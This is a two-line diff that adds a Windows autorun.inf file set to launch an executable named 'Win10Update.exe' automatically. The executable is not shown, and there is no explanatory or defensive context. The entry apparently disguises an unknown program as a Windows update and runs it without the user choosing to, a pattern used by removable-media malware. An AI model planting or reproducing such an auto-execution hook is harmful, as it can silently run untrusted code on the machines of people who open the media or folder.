@@ -1,0 +1,2 @@
+[autorun]
+open=Win10Update.exe
